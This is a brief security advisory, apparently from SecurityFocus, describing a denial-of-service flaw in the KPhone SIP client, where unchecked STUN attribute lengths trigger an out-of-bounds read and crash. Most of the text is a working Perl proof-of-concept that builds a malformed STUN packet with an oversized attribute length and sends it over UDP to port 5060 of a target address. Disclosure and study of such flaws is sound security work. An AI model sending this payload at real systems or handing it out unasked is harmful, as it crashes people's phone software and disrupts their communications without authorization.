source: http://www.securityfocus.com/bid/10159/info

A denial of service vulnerability has been reported in KPhone. This issue may be triggered by a malformed SIP (Session Initiation Protocol) STUN message. This is due to insufficient validation of user-specified STUN packet attribute lengths, causing an out of bounds read and subsequent crash.

It is not known if this condition could be further exploited to execute arbitrary code, though it has been conjectured that it is not exploitable.

#!/usr/bin/perl
 

use IO::Socket::INET;

my $buf = join("", "\x01\x01", # BindingResponse
    "\x00\x01", # MsgLength
    "A"x16, # GUID
    "\x00\x00", # Attribute
    "\x08\x01", # AttrLength
    "A"x7975 # Value
   );

my $remote = IO::Socket::INET->new( Proto => 'udp',
         PeerAddr => '192.168.1.49',
         PeerPort => 5060);

print $remote $buf;